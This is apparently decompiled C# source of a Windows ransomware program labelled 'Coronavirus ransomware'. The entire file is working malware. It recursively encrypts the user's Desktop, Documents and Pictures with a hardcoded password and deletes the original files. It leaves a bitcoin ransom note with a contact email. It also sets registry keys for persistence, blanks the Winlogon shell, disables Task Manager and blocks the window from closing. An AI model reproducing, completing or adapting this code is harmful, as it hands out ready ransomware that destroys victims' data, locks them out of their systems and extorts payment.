using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using covid.Properties;

namespace covid;

public class Form1 : Form
{
	private const bool DELETE_ALL_ORIGINALS = true;

	private const bool ENCRYPT_DESKTOP = true;

	private const bool ENCRYPT_DOCUMENTS = true;

	private const bool ENCRYPT_PICTURES = true;

	private const string ENCRYPTED_FILE_EXTENSION = ".ncovid";

	private const string ENCRYPT_PASSWORD = "4758475648657834585706";

	private const string BITCOIN_ADDRESS = "4HD74J5gd6G6f6jj49786";

	private const string BITCOIN_RANSOM_AMOUNT = "1";

	private const string EMAIL_ADDRESS = "Ciastko.zlukrem@gmail.com";

	private static string ENCRYPTION_LOG = "";

	private string RANSOM_LETTER = "All of your files have been encrypted.\n\nTo unlock them, please send 1 bitcoin(s) to BTC address: 4HD74J5gd6G6f6jj49786\nAfterwards, please email your transaction ID to: Ciastko.zlukrem@gmail.com\n\nThank you and have a nice day!\n\nEncryption Log:\n----------------------------------------\n";

	private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private static int encryptedFileCount = 0;

	private IContainer components = null;

	private Label lblCount;

	private Label lblBitcoinAmount;

	private Label txtBitcoinAddress;

	private Label txtEmailAddress;

	public Form1()
	{
		InitializeComponent();
		Reg();
	}

	private static void Reg()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("covid", Application.get_ExecutablePath().ToString());
		RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey2.SetValue("Shell", "empty", RegistryValueKind.String);
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey3.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		initializeForm();
		encryptFolderContents(DESKTOP_FOLDER);
		encryptFolderContents(PICTURES_FOLDER);
		encryptFolderContents(DOCUMENTS_FOLDER);
		if (encryptedFileCount > 0)
		{
			formatFormPostEncryption();
			dropRansomLetter();
		}
		else
		{
			Console.Out.WriteLine("No files to encrypt.");
			Application.Exit();
		}
	}

	private void dropRansomLetter()
	{
		StreamWriter streamWriter = new StreamWriter(DESKTOP_FOLDER + "\\___RECOVER__FILES__.ncovid.txt");
		streamWriter.WriteLine(RANSOM_LETTER);
		streamWriter.WriteLine(ENCRYPTION_LOG);
		streamWriter.Close();
	}

	private void formatFormPostEncryption()
	{
		((Form)this).set_Opacity(100.0);
	}

	private void initializeForm()
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
	}

	private static void encryptFolderContents(string sDir)
	{
		try
		{
			string[] files = Directory.GetFiles(sDir);
			foreach (string text in files)
			{
				if (!text.Contains(".ncovid"))
				{
					Console.Out.WriteLine("Encrypting: " + text);
					FileEncrypt(text, "4758475648657834585706");
				}
			}
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				encryptFolderContents(sDir2);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
	}

	private static void FileEncrypt(string inputFile, string password)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(inputFile + ".ncovid", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
		finally
		{
			ENCRYPTION_LOG = ENCRYPTION_LOG + inputFile + "\n";
			encryptedFileCount++;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
	}

	private static void FileDecrypt(string inputFile, string outputFile, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CBC;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException ex)
		{
			Console.WriteLine("CryptographicException error: " + ex.Message);
		}
		catch (Exception ex2)
		{
			Console.WriteLine("Error: " + ex2.Message);
		}
		try
		{
			cryptoStream.Close();
		}
		catch (Exception ex3)
		{
			Console.WriteLine("Error by closing CryptoStream: " + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			for (int i = 0; i < 10; i++)
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
		}
		return array;
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		//IL_0160: Unknown result type (might be due to invalid IL or missing references)
		//IL_016a: Expected O, but got Unknown
		//IL_02f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fe: Expected O, but got Unknown
		lblCount = new Label();
		lblBitcoinAmount = new Label();
		txtBitcoinAddress = new Label();
		txtEmailAddress = new Label();
		((Control)this).SuspendLayout();
		((Control)lblCount).set_AutoSize(true);
		((Control)lblCount).set_Font(new Font("Microsoft Sans Serif", 27.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)lblCount).set_Location(new Point(12, 74));
		((Control)lblCount).set_Name("lblCount");
		((Control)lblCount).set_Size(new Size(435, 42));
		((Control)lblCount).set_TabIndex(0);
		((Control)lblCount).set_Text("Coronavirus ransomware");
		((Control)lblBitcoinAmount).set_AutoSize(true);
		((Control)lblBitcoinAmount).set_Font(new Font("Microsoft Sans Serif", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)lblBitcoinAmount).set_Location(new Point(83, 192));
		((Control)lblBitcoinAmount).set_Name("lblBitcoinAmount");
		((Control)lblBitcoinAmount).set_Size(new Size(742, 58));
		((Control)lblBitcoinAmount).set_TabIndex(1);
		((Control)lblBitcoinAmount).set_Text("Your files have been encrypted by special algorithm. The only option\r\nis to reinstall the system. have a nice day");
		((Control)txtBitcoinAddress).set_AutoSize(true);
		((Control)txtBitcoinAddress).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)txtBitcoinAddress).set_ForeColor(Color.Red);
		((Control)txtBitcoinAddress).set_Location(new Point(263, 9));
		((Control)txtBitcoinAddress).set_Name("txtBitcoinAddress");
		((Control)txtBitcoinAddress).set_Size(new Size(455, 37));
		((Control)txtBitcoinAddress).set_TabIndex(2);
		((Control)txtBitcoinAddress).set_Text("Your files have been encrypted");
		((Control)txtEmailAddress).set_AutoSize(true);
		((Control)txtEmailAddress).set_Location(new Point(342, 684));
		((Control)txtEmailAddress).set_Name("txtEmailAddress");
		((Control)txtEmailAddress).set_Size(new Size(35, 13));
		((Control)txtEmailAddress).set_TabIndex(3);
		((Control)txtEmailAddress).set_Text("label1");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)Resources.worm_shield);
		((Control)this).set_BackgroundImageLayout((ImageLayout)2);
		((Form)this).set_ClientSize(new Size(913, 329));
		((Control)this).get_Controls().Add((Control)(object)txtEmailAddress);
		((Control)this).get_Controls().Add((Control)(object)txtBitcoinAddress);
		((Control)this).get_Controls().Add((Control)(object)lblBitcoinAmount);
		((Control)this).get_Controls().Add((Control)(object)lblCount);
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
